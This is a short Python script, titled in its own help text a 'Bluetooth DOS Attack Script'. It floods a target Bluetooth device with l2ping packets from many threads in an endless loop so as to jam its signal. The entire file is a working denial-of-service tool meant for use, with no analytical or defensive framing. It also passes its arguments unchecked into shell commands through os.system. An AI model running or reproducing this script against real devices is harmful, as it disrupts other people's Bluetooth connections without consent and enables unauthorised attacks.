import os
import threading
import time
import argparse

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) + ' -f ' + target_addr)

def main(target_addr, packages_size, threads_count):
    print("\x1b[31m[*] Jamming target device BT signal in 3 seconds...")
    for i in range(3, 0, -1):
        print('[*] ' + str(i))
    
    os.system('clear')
    print('[*] Building threads...\n')
    
    # Inicia as threads em loop
    while True:
        for i in range(threads_count):
            print('[*] Built thread №' + str(i + 1))
            time.sleep(0.003)
            try:
                threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
            except:
                pass
        
        print('[*] Built all threads...')
        print('[*] Starting...')
        
        time.sleep(0.01)  # Pausa de 0.01 segundo antes de reiniciar o loop

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Bluetooth DOS Attack Script')
    parser.add_argument('target', type=str, help='Target address to attack.')
    parser.add_argument('packet_size', type=int, help='Size of the packets to send.')
    parser.add_argument('threads', type=int, help='Number of threads to use.')

    args = parser.parse_args()

    try:
        os.system('clear')
        main(args.target, args.packet_size, args.threads)
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except:
        pass